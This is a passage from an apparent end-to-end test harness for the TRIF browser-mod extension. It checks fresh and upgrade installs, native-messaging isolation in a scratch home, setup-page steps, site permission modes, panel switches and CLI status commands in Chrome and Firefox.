          mods: [...document.querySelectorAll('#mod-list > li')].map((li) => li.dataset.mod) };
      }`);
      let last = null;
      const until = (what, ok) => waitFor(what, async () => { last = await link(); return ok(last) ? last : null; }, { timeoutMs: 15000 })
        .catch((e) => { throw new Error(`${e.message}: ${JSON.stringify(last)}`); });
      try {
        const st = await until('the link on the site\'s panel', (x) => x.site === L.host.replace(/^www\./, '') && x.shown); // (the panel names it without www.)
        if (st.text !== `Add Tim’s mods for ${L.name}` || !st.gate || !st.inGate) throw new Error(JSON.stringify(st));
        await sleep(300);
        await this.shot(this.panelCtx, 'starter-site-link');
        await this.panelClick('#site-starter-link');
        const want = shippedFor(L.site);
        const on = SITES_ON.includes(L.site);
        const after = await until('the mods added', (x) => !x.shown && !x.err && want.every((id) => fs.existsSync(path.join(this.trif, 'sites', `${id}.js`)))
          // (restrictive, as Chrome is here: on, but the site isn't connected yet, so the panel stays grey)
          && (on ? want.every((id) => x.mods.includes(id)) && x.gate === !!this.restrictive : x.gate));
        const e = (await this.cli(['status'], { json: true })).json.extension;
        if (e.sitesOn.includes(L.site) !== on) throw new Error(`TRIF ${on ? 'not ' : ''}on for ${L.site}: ${e.sitesOn}`);
        if (on && this.restrictive && !(e.disconnected || []).includes(L.site)) throw new Error(`restrictive, but ${L.site} isn't listed as disconnected: ${e.disconnected}`);
        if (!this.addedSites().includes(L.site)) throw new Error(`${L.site} not recorded as added`);
        await sleep(300);
        await this.shot(this.panelCtx, 'starter-site-added');
        return `${want.length} mods for ${L.site}${on ? `, TRIF on there${this.restrictive ? ' (not connected yet: restrictive)' : ''}, listed: ${after.mods.length}` : ', TRIF still off there (not in SITES_ON)'}`;
      } finally {
        await this.ext(`async (id) => { await chrome.tabs.remove(id); }`, [tab]).catch(() => {});
        await this.ext(`async (id) => { await chrome.tabs.update(id, { active: true }); }`, [win.tabId]).catch(() => {});
      }
    });
  }

  // ---- the scenario

  async run() {
    const t0 = Date.now();
    const r = this.r;
    r.setGroup(`${this.o.browser} ${this.o.kind}${this.o.kind === 'upgrade' ? ` from ${path.basename(this.o.oldTgz)}` : ''}`);
    fs.rmSync(this.work, { recursive: true, force: true });
    this._keychain = null;
    fs.mkdirSync(this.home, { recursive: true });
    const before = fingerprint(REAL_FILES);
    try {
      const installed = await r.check('install from the npm package into a scratch home', () => this.install());
      if (!installed) return;
      const started = await r.check('browser starts with the extension, isolated to the scratch helper', () => this.startBrowser());
      if (started) await this.browserChecks();
    } finally {
      if (this.d && this.d.proc) {
        await r.check('console: no warnings or errors from the extension or pages', () => this.consoleCheck());
        await this.d.stop().catch((e) => r.note(`stopping the browser: ${e.message}`));
      }
      await r.check('helper log: no warnings or errors', () => this.helperLogCheck());
      const leaked = await killMatching(this.work + '/');
      if (leaked) r.note(`killed ${leaked} leftover process(es) using ${this.work}`);
      await r.check('real browser setup untouched (native host manifests, ~/.trif, ~/.webmods)', async () => {
        const after = fingerprint(REAL_FILES);
        if (after !== before) throw new Error(`changed:\n${after}`);
        return 'unchanged';
      });
      r.note(`${this.label} took ${((Date.now() - t0) / 1000).toFixed(0)} s`);
    }
  }

  async install() {
    const o = this.o;
    const pkg = I.unpack(o.newTgz, path.join(this.work, 'pkg'));
    const browserArg = o.browser;
    if (o.kind === 'fresh') {
      const s = I.runSetup(pkg, this.home, ['--browser', browserArg]);
      this.r.log(s.out);
      if (s.status !== 0) throw new Error(`setup exited ${s.status}:\n${s.out.split('\n').slice(-15).join('\n')}`);
    } else {
      const oldPkg = I.unpack(o.oldTgz, path.join(this.work, 'oldpkg'));
      const s0 = I.runSetup(oldPkg, this.home, ['--browser', I.oldBrowserArg(oldPkg, browserArg)]);
      this.r.log(s0.out);
      if (s0.status !== 0) throw new Error(`the old release's setup exited ${s0.status}:\n${s0.out.split('\n').slice(-15).join('\n')}`);
      const legacy = path.join(this.home, '.webmods');
      if (!fs.existsSync(path.join(legacy, 'sites'))) throw new Error(`the old setup made no ${legacy}/sites`);
      // The user's own mod, and an edit to a shipped one, before upgrading.
      fs.mkdirSync(path.join(legacy, 'sites', '127.0.0.1'), { recursive: true });
      fs.writeFileSync(path.join(legacy, 'sites', '127.0.0.1', 'e2e-user.js'), USER_MOD);
      const shipped = path.join(legacy, 'sites', 'x.com', 'rainbow-rave.js');
      fs.appendFileSync(shipped, '\n// e2e: the user changed this shipped mod\n');
      this.r.note(I.ensureShippedUpdate(oldPkg, pkg, 'x.com/rainbow-rave'));
      // The way a 0.1.x helper's updater runs the new version's setup (--home ~/.webmods).
      const s = I.runSetup(pkg, this.home, ['--home', legacy, '--browser', browserArg]);
      this.r.log(s.out);
      if (s.status !== 0) throw new Error(`setup exited ${s.status}:\n${s.out.split('\n').slice(-15).join('\n')}`);
      await this.r.check('upgrade: ~/.webmods moved to ~/.trif, link left behind', () => {
        const st = fs.lstatSync(legacy);
        if (!st.isSymbolicLink()) throw new Error('~/.webmods is not a link');
        if (fs.realpathSync(legacy) !== fs.realpathSync(this.trif)) throw new Error(`~/.webmods points at ${fs.readlinkSync(legacy)}`);
        return `~/.webmods -> ${fs.readlinkSync(legacy)}`;
      });
      await this.r.check('upgrade: TRIF\'s private files moved out of the workspace', () => {
        const left = ['config.json', 'runs', 'helper.log', 'screenshots', 'safari-token'].filter((f) => fs.existsSync(path.join(this.trif, f)));
        if (left.length) throw new Error(`still in the workspace: ${left.join(', ')}`);
        if (!fs.existsSync(path.join(this.priv, 'config.json'))) throw new Error(`no config.json in ${this.priv}`);
        return `config.json and the rest in ${path.relative(this.home, this.priv)}`;
      });
      await this.r.check('upgrade: the user\'s own mod kept', () => {
        if (!fs.existsSync(path.join(this.trif, 'sites', '127.0.0.1', 'e2e-user.js'))) throw new Error('sites/127.0.0.1/e2e-user.js is gone');
      });
      await this.r.check('upgrade: the edited shipped mod kept, new version waiting', () => {
        const text = fs.readFileSync(path.join(this.trif, 'sites', 'x.com', 'rainbow-rave.js'), 'utf8');
        if (!text.includes('the user changed this shipped mod')) throw new Error('the user\'s edit is gone');
        const pre = I.readJson(path.join(this.trif, 'preinstalled.json')) || {};
        const rec = (pre.shipped || {})['x.com/rainbow-rave'];
        if (!rec || !rec.pending) throw new Error(`no pending update recorded: ${JSON.stringify(rec)}`);
        if (!/new version waiting/.test(s.out)) throw new Error('setup didn\'t say a new version is waiting');
        return `pending version ${rec.pending.version}`;
      });
      // The shipped mods 0.2.0 folded into others (preinstalled.js RETIRED), unchanged here: in the trash.
      const retired = RETIRED.filter((x) => fs.existsSync(path.join(oldPkg, 'examples', 'sites', `${x.id}.js`)));
      if (retired.length) {
        await this.r.check('upgrade: the shipped mods folded into others went to the trash', () => {
          const pre = I.readJson(path.join(this.trif, 'preinstalled.json')) || {};
          for (const { id, into } of retired) {
            if (fs.existsSync(path.join(this.trif, 'sites', `${id}.js`))) throw new Error(`${id} is still in sites`);
            const rec = (pre.shipped || {})[id];
            if (!rec || !rec.retired || rec.retired.into !== into || !rec.retired.trashed) throw new Error(`${id}: ${JSON.stringify(rec)}`);
            if (!fs.existsSync(path.join(this.trif, 'trash', id.split('/')[0], rec.retired.trashed))) throw new Error(`${id} isn't in the trash`);
          }
          return retired.map((x) => `${x.id.split('/')[1]} -> ${x.into.split('/')[1]}`).join(', ');
        });
      }
    }
    // Where setup put the browser's native host manifest: inside the scratch home.
    const manifest = o.browser === 'firefox'
      ? path.join(this.home, 'Library/Application Support/Mozilla/NativeMessagingHosts/com.webmods.helper.json')
      : path.join(this.home, 'Library/Application Support/Google/Chrome/NativeMessagingHosts/com.webmods.helper.json');
    const m = I.readJson(manifest);
    if (!m) throw new Error(`no manifest at ${manifest}`);
    if (m.path !== path.join(this.trif, 'bin', 'trif-host')) throw new Error(`manifest path is ${m.path}`);
    if (!fs.existsSync(path.join(this.trif, 'app', 'extension', 'manifest.json'))) throw new Error('no app/extension in the scratch home');
    // The harness's own mods, and config: no update checks (hermetic), and a canary the agent must not read.
    fs.mkdirSync(path.join(this.trif, 'sites', '127.0.0.1'), { recursive: true });
    fs.mkdirSync(path.join(this.trif, 'sites', 'localhost'), { recursive: true });
    fs.writeFileSync(path.join(this.trif, 'sites', '127.0.0.1', 'e2e-banner.js'), BANNER_MOD);
    fs.writeFileSync(path.join(this.trif, 'sites', 'localhost', 'e2e-off.js'), OFF_SITE_MOD);
    const cfgFile = path.join(this.priv, 'config.json');
    if (fs.existsSync(path.join(this.trif, 'config.json'))) throw new Error('setup left a config.json in the workspace');
    const cfg = I.readJson(cfgFile) || {};
    this.canary = `canary-${crypto.randomBytes(6).toString('hex')}`;
    Object.assign(cfg, { checkForUpdates: false, e2eCanary: this.canary });
    fs.writeFileSync(cfgFile, JSON.stringify(cfg, null, 2) + '\n');
    return `${o.kind === 'fresh' ? 'setup' : 'old setup, then new setup'} ok; manifest ${path.relative(this.home, manifest)}`;
  }

  async startBrowser() {
    const o = this.o;
    // The helper inherits the browser's environment. HOME=<scratch> keeps everything in the scratch home;
    // for agent runs, which need your real Claude Code / Codex login, the browser (and so the helper and
    // the agents it starts) gets your real HOME, and TRIF_HOME points the helper at the scratch workspace.
    const env = o.agent || o.codex || o.oss || o.guidance ? { HOME: REAL_HOME, TRIF_HOME: this.trif, TRIF_PRIVATE: this.priv } : { HOME: this.home };
    // The real Keychain only for --oss (the OpenRouter key the user saved); otherwise the fake one, so the
    // helper never looks up API keys for Claude Code or Codex in the real one.
    if (!o.oss) env.TRIF_KEYCHAIN_BIN = this.keychain().bin;
    // Show in Finder and Open in editor run a stand-in that writes what it was asked to a log, never open
    // (no Finder window on anyone's screen); codeViewCheck checks the helper says so before it clicks.
    env.TRIF_REVEAL_CMD = this.revealStub().bin;
    this.helperHome = env.HOME;
    // Upgrading: TRIF with access to every site, as for someone who installed it when <all_urls> was
    // required (Chrome and Firefox keep it on the update). Fresh: only the sites the user allows.
    this.allSites = o.kind === 'upgrade';
    if (o.browser === 'firefox') {
      this.d = new FirefoxDriver({
        profile: path.join(this.work, 'profile'), home: env.HOME, env,
        nativeDir: path.join(this.home, 'Library/Application Support/Mozilla'),
        extensionDir: o.extensionDirFirefox, headless: o.headless,
      });
    } else {
      // Fresh: TRIF allowed on the suite's sites only (lib/chrome.js), as a new user who turned it on there.
      this.d = new ChromeDriver({
        userDataDir: path.join(this.home, 'Library/Application Support/Google/Chrome'), home: env.HOME, env,
        extensionDir: path.join(this.trif, 'app', 'extension'), headless: o.headless, siteAccess: this.allSites ? 'all' : undefined,
        // (The sites whose panel offers "Add Tim's mods": never the real ones. Firefox resolves every host here.)
        hosts: [...new Set(Object.values(LINK_SITE).map((x) => x.host))],
      });
    }
    await this.d.start();
    const iso = await this.d.isolateNativeMessaging();
    this.r.log(`native messaging manifests read from: ${JSON.stringify(iso)}`);
    await this.d.installExtension();
    if (this.allSites && o.browser === 'firefox') {
      // Firefox: <all_urls> asked for from a click (prompts are off here), then the add-on restarted, so it
      // has it from its start as an updated install does (Firefox gives captureTab only then: screenshot.js).
      const ctx = await this.d.openTab(`${this.d.origin}/onboarding.html`);
      if (!(await this.d.setAllSites(ctx, true))) throw new Error('permissions.request for <all_urls> said no');
      await this.d.restartAddon();
    }
    const st = await waitFor('the helper to answer `trif status`', async () => {
      const s = await this.cli(['status'], { json: true, timeoutMs: 15000 });
      return s.json && s.json.extension ? s.json : null;
    }, { timeoutMs: 30000 });
    this.helperPid = st.helper.pid;
    // The helper must be one started from the scratch home.
    const proc = pidsMatching('host.js').find((p) => p.pid === this.helperPid);
    if (!proc || !proc.command.includes(this.trif)) throw new Error(`the helper (pid ${this.helperPid}) isn't the scratch one: ${proc && proc.command}`);
    if (!fs.existsSync(path.join(this.trif, `helper-${this.helperPid}.sock`))) throw new Error('no helper socket in the scratch home');
    // No helper from anywhere else was started by this browser.
    const strays = pidsMatching('host.js').filter((p) => !p.command.includes(this.work) && run('/bin/ps', ['-o', 'ppid=', '-p', String(p.pid)]).stdout.trim() === String(this.d.proc.pid));
    if (strays.length) throw new Error(`this browser started a helper outside the scratch home: ${strays.map((p) => p.command).join('; ')}`);
    return `${this.d.name} ${this.d.version}; helper pid ${this.helperPid} (${(proc.command.match(/\S*host\.js/) || [proc.command])[0]})`;
  }

  async browserChecks() {
    const r = this.r;
    const d = this.d;
    const { port, tlsPort, timeline } = this.o.servers;
    const origin = d.origin;

    // The setup page: our handle on the extension's chrome.* APIs, and the user scripts permission.
    this.control = await d.openTab(`${origin}/onboarding.html`);
    await r.check('setup page: a checklist, the helper and the browser ticked, user scripts next', async () => {
      // (Upgrading, Tim's mods are there already and TRIF has every site: those steps are ticked.)
      const later = this.o.kind === 'upgrade' ? 'done,done' : 'later,later';
      const x = await this.waitSetup('step 3 open', (st) => st.steps.join() === `done,done,now,${later},later,later`);
      if (x.docTitle !== 'TRIF setup' || x.title !== 'Set up TRIF' || x.states.join() !== (this.o.kind === 'upgrade' ? 'connected,done,Google, X, Amazon and Instagram,permissive' : 'connected,done')) throw new Error(JSON.stringify(x));
      const want = d.name === 'Firefox' ? /Firefox asks before an add-on runs them\.[\s\S]*Allow user scripts/ : /One switch:[\s\S]*flip this[\s\S]*Open TRIF’s Chrome settings/;
      if (!want.test(x.now)) throw new Error(`step 3 says: ${x.now}`);
      await this.shot(this.control, 'setup-page-scripts-off');
      return x.now.split('\n').slice(0, 2).join(' / ');
    });
    const allowed = await r.check('user scripts allowed', async () => {
      const how = await d.grantUserScripts(this.control);
      await waitFor('status.userScripts', async () => (await this.cli(['status'], { json: true })).json?.extension?.userScripts, { timeoutMs: 20000 });
      return how;
    });
    if (allowed) await this.starterSetupCheck();
    // Site permissions, the setup page's step 5: permissive or restrictive. Upgrading, TRIF has <all_urls>
    // already (lib/chrome.js, or asked for and the add-on restarted in Firefox): permissive, ticked. Fresh,
    // it's open; it's chosen after the shipped mods are checked.
    const asksMode = !this.allSites;
    if (allowed) {
      await r.check(asksMode ? 'setup page: user scripts ticked by themselves; Site permissions next: Permissive or Restrictive'
        : 'setup page: user scripts ticked by themselves; Site permissions ticked too (permissive, kept from before)', async () => {
        const x = await this.waitSetup('step 5 open', (st) => (asksMode ? st.steps.join() === 'done,done,done,done,now,later,later' : st.steps[4] === 'done'));
        if (!asksMode) {
          if (x.states[4] !== 'permissive') throw new Error(`step 5 ticked as ${x.states[4]}`);
          return `ticked: ${x.states.join(', ')}`;
        }
        const words = ['Site permissions', 'Permissive', 'access to every site by default', 'Restrictive', 'connect TRIF on a site-to-site basis', 'You can change this later.'];
        if (!words.every((w) => x.now.includes(w))) throw new Error(`step 5: ${JSON.stringify(x.now)}`);
        await this.shot(this.control, 'setup-page-site-permissions');
        return x.now.split('\n').slice(0, 3).join(' / ');
      });
    }

    const connected = await r.check('helper connected (trif status, extension hello)', async () => {
      const s = (await this.cli(['status'], { json: true })).json;
      const e = s.extension;
      if (!e) throw new Error('no extension status');
      if (e.browser !== d.name) throw new Error(`extension says it's in ${e.browser}`);
      return `helper v${s.helper.helper}, extension v${e.version} on ${e.browser} ${e.chrome}, user scripts ${e.userScripts ? 'on' : 'off'}`;
    });

    if (!connected) return;
    // "Agent on this site" (extension/agentsites.js): the harness drives its test sites with trif run, as an
    // agent would, so they're set to Run code, as the user would; agentSitesCheck tests the levels and Ask.
    await this.ext(`async (sites) => { await chrome.storage.local.set({ agentSites: sites }); }`, [AGENT_SITES]);
    await r.check('trif doctor', async () => {
      const doc = await this.cli(['doctor'], { json: true, timeoutMs: 60000 });
      if (!doc.json) throw new Error(`no JSON: ${doc.stdout} ${doc.stderr}`);
      r.log(JSON.stringify(doc.json, null, 2));
      const fails = doc.json.checks.filter((c) => c.status === 'fail');
      // Expected in the scratch home: the CLI isn't on PATH (setup ran with --no-link), and the agents
      // aren't logged in there (doctor runs with HOME=<scratch>; their logins are in your real home).
      const expected = (c) => /not on your PATH|isn't logged in/.test(c.title);
      const warns = doc.json.checks.filter((c) => c.status === 'warn' && !expected(c));
      const connected = doc.json.checks.find((c) => /helper|extension/i.test(c.title) && c.status === 'ok');
      if (fails.length) throw new Error(fails.map((c) => c.title).join('; '));
      if (!connected) throw new Error('doctor has no passing helper/extension check');
      return warns.length ? { status: 'warn', detail: `warnings: ${warns.map((c) => c.title).join('; ')}` } : `${doc.json.checks.length} checks ok`;
    });

    await r.check('shipped mods present and recognised (trif mods, trif status): the sites added, and only those', async () => {
      const mods = (await this.cli(['mods'], { json: true })).json;
      const list = Array.isArray(mods) ? mods : (mods && (mods.mods || [])) || [];
      const shipped = list.filter((m) => m.source === 'webmods' || m.source === 'trif');
      // Every mod TRIF ships for the sites added is there (fresh: the ones picked on the setup page; an
      // upgrade: every site it had); each is marked as shipped (@source), except a copy the user edited
      // before 0.1.2, when the shipped mods had no @source line yet. None for the other sites.
      const added = this.addedSites();
      const left = (I.readJson(path.join(this.trif, 'preinstalled.json')) || {}).skipped || [];
      const want = SHIPPED_IDS.filter((id) => added.includes(siteOf(id)) && !left.includes(id));
      const ids = new Set(list.map((m) => m.id));
      const missing = want.filter((id) => !ids.has(id));
      if (missing.length) throw new Error(`missing: ${missing.join(', ')}`);
      const extra = SHIPPED_IDS.filter((id) => (!added.includes(siteOf(id)) || left.includes(id)) && ids.has(id));
      if (extra.length) throw new Error(`there, for sites not added: ${extra.join(', ')}`);
      const unmarked = want.filter((id) => !shipped.some((m) => m.id === id) && !(this.o.kind === 'upgrade' && id === 'x.com/rainbow-rave'));
      if (unmarked.length) throw new Error(`not recognised as shipped: ${unmarked.join(', ')}`);
      const st = (await this.cli(['status'], { json: true })).json.extension;
      const byId = new Map(st.mods.map((m) => [m.id, m]));
      const px = byId.get('x.com/detox-timeline');
      if (!px || px.enabled === false) throw new Error(`x.com/detox-timeline not on: ${JSON.stringify(px)}`);
      // A mod that starts off arrives off (ticked means on the computer, not switched on).
      const offId = this.o.kind === 'fresh' ? 'x.com/space-shooter' : 'x.com/rainbow-rave';
      const pf = byId.get(offId);
      if (!pf || pf.enabled !== false) throw new Error(`${offId} should start off: ${JSON.stringify(pf)}`);
      for (const s of SITES_ON) {
        if (added.includes(s) !== (st.sitesOn || []).includes(s)) throw new Error(`TRIF is ${added.includes(s) ? 'not ' : ''}on for ${s}: ${st.sitesOn}`);
      }
      if (this.o.kind === 'upgrade') {
        const u = list.find((m) => m.id === 'x.com/rainbow-rave');
        if (!u || !u.update) throw new Error(`trif mods shows no update for x.com/rainbow-rave: ${JSON.stringify(u)}`);
        // The retired mods' switches were handed to the mods they went into (once; both on here).
        const gone = RETIRED.filter((x) => !ids.has(x.id) && ((I.readJson(path.join(this.trif, 'preinstalled.json')) || {}).shipped || {})[x.id]?.retired?.trashed);
        const { absorbed = {} } = await this.ext(`async () => chrome.storage.local.get('absorbed')`);
        const missed = gone.filter((x) => absorbed[x.id] !== true || byId.get(x.into)?.enabled === false);
        if (missed.length) throw new Error(`switches not carried over for ${missed.map((x) => x.id).join(', ')}: absorbed ${JSON.stringify(absorbed)}`);
      }
      return `${shipped.length} shipped (${shipped.filter((m) => byId.get(m.id)?.enabled !== false).length} on) for ${added.join(', ')}; sites on: ${st.sitesOn.join(', ')}`;
    });

    // Fresh: Firefox clicks Permissive and says no to Firefox's prompt (answered from the browser's side),
    // so TRIF is restrictive, said under the ticked step; Chrome (its prompt can't be answered here) clicks
    // Restrictive. Either way no site TRIF starts on is connected yet but the test build's.
    if (allowed) {
      await r.check(!asksMode ? 'setup page: the agent\'s login next'
        : this.o.browser === 'firefox' ? 'setup page: Permissive, the prompt declined: restrictive, and a line saying so; the agent\'s login next'
          : 'setup page: Restrictive, no prompt: restrictive; the agent\'s login next', async () => {
        const ff = this.o.browser === 'firefox';
        if (asksMode && ff) {
          await d.setPermissionPrompts(true);
          await d.click(this.control, '#mode-permissive');
          await d.answerPermissionPrompt(false);
          await d.setPermissionPrompts(false);
        } else if (asksMode) await d.click(this.control, '#mode-restrictive');
        const x = await this.waitSetup('step 6 open', (st) => (st.steps.join() === 'done,done,done,done,done,now,later' && /\n\n/.test(st.now) && !/Checking your coding agent/.test(st.now))
          || st.steps.join() === 'done,done,done,done,done,done,now');
        if (x.steps[5] === 'now' && !/is logged in on this computer yet|couldn’t tell whether .* (is|are) logged in|needs a coding agent/.test(x.now) || /Use another agent/.test(x.now)) throw new Error(`step 6 says: ${x.now}`);
        const want = asksMode ? 'restrictive' : 'permissive';
        if (x.states[4] !== want) throw new Error(`step 5 ticked as ${x.states[4]}`);
        const note = await this.ext(`async () => { const n = document.querySelector('#step-sites .step-note'); return n.hidden ? '' : n.textContent; }`);
        if (asksMode && ff && note !== 'Firefox didn’t get your OK, so TRIF is restrictive. You can switch to permissive later in the sidebar’s Settings.') throw new Error(`the note: ${JSON.stringify(note)}`);
        if (!(asksMode && ff) && note) throw new Error(`a note: ${note}`);
        const st = (await this.cli(['status'], { json: true })).json.extension;
        // (only the sites added on the setup page are on; Chrome's test build has access to x.com and google.com)
        const disconnected = asksMode && ff ? SITES_START.filter((x) => FRESH_PICKS.includes(x)) : [];
        if (st.siteMode !== want || JSON.stringify(st.disconnected) !== JSON.stringify(disconnected)) throw new Error(`status: ${JSON.stringify([st.siteMode, st.disconnected])}`);
        const text = await this.cli(['status']);
        if (!new RegExp(`^site mode {5}${want}`, 'm').test(text.stdout)) throw new Error(`trif status: ${text.stdout}`);
        await this.shot(this.control, 'setup-page-login');
        return `${want}${note ? ` ("${note}")` : ''}; disconnected ${st.disconnected.join(', ') || 'none'}; ${x.steps[5] === 'now' ? x.now.split('\n').slice(0, 2).join(' / ') : 'the agent is logged in already'}`;
      });
    }

    if (!allowed) { r.note('user scripts are off, so the page checks were skipped'); return; }

    // ---- the test window and the panel following it
    const base = `http://127.0.0.1:${port}`;
    this.pageUrlPrefix = base;
    const win = await this.ext(`async (url) => { const w = await chrome.windows.create({ url, width: 1100, height: 850, focused: true }); return { windowId: w.id, tabId: w.tabs[0].id }; }`, [`${base}/?e2e=1`]);
    this.win = win;
    await this.waitPage('the test page', (s) => s.ready === 'complete');
    await this.ext(`async (url, win) => { await chrome.windows.create({ url, width: 420, height: 900 }); }`, [`${origin}/sidepanel.html?window=${win.windowId}`, win.windowId]);
    this.panelCtx = await d.findPage('sidepanel.html');

    // Fresh Firefox is restrictive with no site connected: 127.0.0.1 is disconnected (the panel all grey).
    // Chrome's fresh test build has 127.0.0.1 (restrictive, connected), and upgrading TRIF has every site
    // (permissive): off.
    this.restrictive = !this.allSites;
    const firstDisconnected = this.o.browser === 'firefox' && !this.allSites;
    await r.check(firstDisconnected ? 'site disconnected by default (restrictive): the mod doesn\'t run, the panel all grey with Connect'
      : 'site off by default: the mod doesn\'t run, the panel shows "The robot is off.", Fix, and Block and Disconnect', async () => {
      const s = await this.pageState();
      if (s.banner) throw new Error('the mod ran on a site TRIF is off for');
      const p = await this.waitPanel('the panel to show the gate', (x) => x.site === '127.0.0.1' && x.gate);
      if (firstDisconnected) {
        if (p.gateTitle !== 'TRIF is disconnected on 127.0.0.1' || p.gateText !== 'Connect' || !p.grey || p.links.length) throw new Error(`the gate: ${JSON.stringify(p)}`);
        await this.shot(this.panelCtx, 'panel-disconnected');
      } else {
        const links = ['Block on 127.0.0.1 (Add to TRIF\'s block list)', 'Disconnect from 127.0.0.1 (Disable browser permissions)'];
        if (p.gateTitle !== 'The robot is off.' || p.gateText !== 'Fix 127.0.0.1' || p.grey || JSON.stringify(p.links) !== JSON.stringify(links)) throw new Error(`the gate: ${JSON.stringify(p)}`);
        await this.shot(this.panelCtx, 'panel-off-links');
        await this.shot(this.panelCtx, this.allSites ? 'panel-off-permissive' : 'panel-off-restrictive');
      }
      return `panel: "${p.gateTitle}" / "${p.gateText}"${p.links.length ? `; ${p.links.join(', ')}` : ''}`;
    });
    await r.check('gate: the top bar keeps only the dot, the robot, grey and dim, and settings', async () => {
      const b = await this.waitBar('the gate\'s bar', GATE_BAR, Scenario.dim);
      if (!b.robotButton) throw new Error('the robot isn\'t a focusable button');
      if (b.robotLabel !== 'Turn the robot on for 127.0.0.1' || b.robotLabel !== b.switchLabel) throw new Error(`labelled "${b.robotLabel}" (the power button: "${b.switchLabel}")`);
      return `"${b.robotLabel}"; ${b.filter}, opacity ${b.opacity}`;
    });
    await this.shot(this.panelCtx, 'panel-gate');

    await r.check('enable TRIF on the site from the panel: the mod runs', async () => {
      await d.click(this.panelCtx, '#gate-btn');
      const s = await this.waitPage('the mod to run after enabling', (x) => x.banner === 'ran' && /Changed by the E2E Banner/.test(x.target));
      if (s.off) throw new Error('the localhost mod ran on 127.0.0.1');
      await this.waitPanel('the panel to list the mod as on and running', (x) => !x.gate && x.siteOn && x.mods.some((m) => m.id === '127.0.0.1/e2e-banner' && m.on && m.running));
      return 'mod applied, panel shows it on and running';
    });
    await this.shot(this.pageCtx, 'page-mod-on');
    await this.shot(this.panelCtx, 'panel-mod-on');

    if (this.o.kind === 'upgrade') {
      await r.check('upgrade: the user\'s mod from before runs', async () => {
        await this.waitPage('the user mod', (x) => x.user === 'ran');
      });
    }

    await r.check('mod switch off in the panel: page reloads without the mod', async () => {
      await d.click(this.panelCtx, 'li[data-mod="127.0.0.1/e2e-banner"] button.switch');
      await this.waitPage('the page without the mod', (x) => !x.banner && x.target === 'Original text.');
      const st = (await this.cli(['status'], { json: true })).json.extension;
      const m = st.mods.find((x) => x.id === '127.0.0.1/e2e-banner');
      if (m.enabled !== false) throw new Error(`trif status says enabled: ${JSON.stringify(m)}`);
      await this.waitPanel('the switch to show off', (x) => x.mods.some((mm) => mm.id === '127.0.0.1/e2e-banner' && !mm.on));
    });
    await this.shot(this.panelCtx, 'panel-mod-off');

    await r.check('mod switch on again in the panel: the mod runs', async () => {
      await d.click(this.panelCtx, 'li[data-mod="127.0.0.1/e2e-banner"] button.switch');
      await this.waitPage('the mod again', (x) => x.banner === 'ran');
    });

    await r.check('trif disable / enable from the CLI: page and panel follow', async () => {
      const off = await this.cli(['disable', '127.0.0.1/e2e-banner', '--url', '127.0.0.1']);
      if (off.status !== 0) throw new Error(`trif disable: ${off.stdout}${off.stderr}`);
      await this.waitPage('the page without the mod', (x) => !x.banner);
      await this.waitPanel('the panel switch to go off', (x) => x.mods.some((m) => m.id === '127.0.0.1/e2e-banner' && !m.on));
      const on = await this.cli(['enable', '127.0.0.1/e2e-banner', '--url', '127.0.0.1']);
      if (on.status !== 0) throw new Error(`trif enable: ${on.stdout}${on.stderr}`);
      await this.waitPage('the mod again', (x) => x.banner === 'ran');
      await this.waitPanel('the panel switch to go on', (x) => x.mods.some((m) => m.id === '127.0.0.1/e2e-banner' && m.on));
    });

    const SITE = ['*://127.0.0.1/*']; // (an IP: just the address, as lib.js siteOrigins asks)
    const hasSite = () => this.ext(`async (o) => chrome.permissions.contains({ origins: o })`, [SITE]);
    const offAgain = async () => {
      await d.click(this.panelCtx, '#site-switch');
      const p = await this.waitPanel('the off screen', (x) => x.gate && x.gateTitle === 'The robot is off.');
      await this.waitPage('the page without the mod', (x) => !x.banner);
      return p;
    };
    await r.check('site switch off in the panel: nothing runs, the access stays (on again asks nothing), Block and Disconnect under Fix; on again: it runs', async () => {
      const p = await offAgain();
      const blocked = await this.cli(['text', '--url', '127.0.0.1']);
      if (blocked.status === 0 || !/^trif text: TRIF is off on 127\.0\.0\.1/.test(blocked.stderr)) throw new Error(`trif text: ${blocked.status} ${blocked.stderr}`);
      if (!(await hasSite())) throw new Error('turning the site off gave its access back');
      if (p.gateText !== 'Fix 127.0.0.1' || p.links.length !== 2) throw new Error(`the gate: ${JSON.stringify(p)}`);
      await this.shot(this.panelCtx, 'panel-site-off');
      await d.click(this.panelCtx, '#gate-btn');
      await this.waitPage('the mod again', (x) => x.banner === 'ran');
      return `page commands refused while off: ${(blocked.stderr || blocked.stdout).trim().split('\n')[0]}`;
    });

    // Restrictive, Firefox (prompts off in this profile, so the asking is real): Disconnect gives the access
    // back and the panel goes grey, agents are told; Connect asks and turns it on in one click; the same
    // after the access is taken away as the browser's settings would. (Chrome's test build has 127.0.0.1 as
    // a required host, which can't be given back: the unit tests cover it there.)
    if (this.o.browser === 'firefox' && !this.allSites) {
      const disconnected = async (how) => {
        const p = await this.waitPanel('the grey panel', (x) => x.gate && x.gateTitle === 'TRIF is disconnected on 127.0.0.1');
        if (p.gateText !== 'Connect' || !p.grey || p.links.length) throw new Error(`${how}: the gate: ${JSON.stringify(p)}`);
        const blocked = await this.cli(['text', '--url', '127.0.0.1']);
        if (blocked.status === 0 || !/TRIF is disconnected on 127\.0\.0\.1: .*until the user connects it/.test(blocked.stderr)) throw new Error(`${how}: trif text: ${blocked.status} ${blocked.stderr}`);
        return blocked.stderr.trim().split('\n')[0];
      };
      const connect = async (how) => {
        await d.click(this.panelCtx, '#gate-btn');
        await this.waitPage(`the mod again (${how})`, (x) => x.banner === 'ran');
        if (!(await hasSite())) throw new Error(`${how}: connected, but the browser has no access recorded`);
      };
      await r.check('restrictive: "Disconnect from 127.0.0.1" gives the access back, the panel goes grey, agents are told; Connect asks and turns it on in one click', async () => {
        await offAgain();
        await d.click(this.panelCtx, '#gate-disconnect');
        const said = await disconnected('disconnected');
        if (await hasSite()) throw new Error('disconnected, but the browser still gives TRIF the site');
        await connect('Connect');
        return said;
      });
      await r.check('restrictive: taken away as the browser\'s settings would: grey, nothing runs; Connect brings it back', async () => {
        if (!(await this.ext(`async (o) => chrome.permissions.remove({ origins: o })`, [SITE]))) throw new Error('permissions.remove said no');
        await this.ext(`async (id) => { await chrome.tabs.reload(id); }`, [this.win.tabId]);
        await this.waitPage('the page without the mod', (x) => !x.banner);
        const said = await disconnected('taken away');
        await connect('Connect');
        return said;
      });
      // Then permissive, from Settings (the prompt answered yes): the rest of the suite runs with every site.
      await r.check('Settings → Site permissions → Permissive: the browser\'s prompt (yes), and TRIF is permissive', async () => {
